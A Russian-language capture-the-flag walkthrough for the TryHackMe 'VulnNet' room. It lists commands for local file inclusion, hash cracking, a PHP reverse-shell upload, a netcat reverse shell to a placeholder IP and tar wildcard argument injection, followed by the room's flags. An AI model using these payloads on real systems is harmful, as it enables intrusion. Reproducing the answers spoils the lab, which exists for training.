[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [VulnNet](https://tryhackme.com/r/room/vulnnet1) 

Всего 1 заданиe:
## Задание 1
Цель этого задания — использовать более реалистичные приемы и объединить их в одном устройстве для отработки навыков.

Уровень сложности: средний
Язык веб-сайта: PHP => Вам придется добавить IP-адрес машины с доменом vulnnet.thm в ваш `/etc/hosts`

Иконка сделана пользователем monkik с сайта www.flaticon.com

### Ответьте на вопросы ниже
Что такое флаг пользователя? (user.txt)
```commandline
echo "<IP> vulnnet.thm" | sudo tee -a /etc/hosts
nmap -sSCV vulnnet.thm
echo "<IP> broadcast.vulnnet.thm" | sudo tee -a /etc/hosts
curl -s http://vulnnet.thm/?referer=/etc/passwd 
curl -s http://vulnnet.thm/?referer=/etc/apache2/sites-enabled/000-default.conf
curl -s http://vulnnet.thm/?referer=/etc/apache2/.htpasswd
# developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
john auth.hash --wordlist=/usr/share/wordlists/rockyou.txt
# developers:9972761drmfsls
searchsploit clipbucket 4.0
curl -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" "http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/beats_uploader.php"
nc -nlvp 4444
find / -type f -user server-management -exec ls -l {} + 2>/dev/null
ssh2john.py id_rsa > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
# id_rsa:oneTWO3gOyac
ssh -i id_rsa server-management@vulnnet.thm
cat user.txt
```
```commandline
THM{907e420d979d8e2992f3d7e16bee1e8b}
```
Что такое корневой флаг? (root.txt)
```commandline
cat /etc/crontab
cd /var/opt/
ls -la
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <my_own_IP> 4444 >/tmp/f" > /home/server-management/Documents/rev.sh
touch "/home/server-management/Documents/--checkpoint=1"
touch "/home/server-management/Documents/--checkpoint-action=exec=sh rev.sh"
nc -nlvp 4444
cat /root/root.txt
```
```commandline
THM{220b671dd8adc301b34c2738ee8295ba}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)